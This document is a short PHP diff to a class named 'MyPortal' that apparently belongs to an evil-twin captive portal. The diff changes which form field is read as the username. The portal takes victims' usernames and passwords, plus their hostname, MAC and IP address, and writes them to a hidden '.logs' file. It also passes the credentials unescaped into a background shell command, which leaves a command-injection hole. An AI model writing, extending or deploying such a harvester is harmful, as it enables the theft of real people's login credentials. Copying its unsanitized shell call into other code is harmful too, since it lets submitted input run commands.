@@ -6,8 +6,8 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
-        if (isset($_POST['id'])) {
-            $email = isset($_POST['id']) ? $_POST['id'] : 'id';
+        if (isset($_POST['UserName'])) {
+            $UserName = isset($_POST['UserName']) ? $_POST['UserName'] : 'UserName';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
             $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
@@ -15,8 +15,8 @@ class MyPortal extends Portal
 
             $reflector = new \ReflectionClass(get_class($this));
             $logPath = dirname($reflector->getFileName());
-            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "id: {$id}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
-            $this->execBackground("notify $id' - '$pwd");
+            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "UserName: {$UserName}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            $this->execBackground("notify $UserName' - '$pwd");
         }
         // handle form input or other extra things there
 
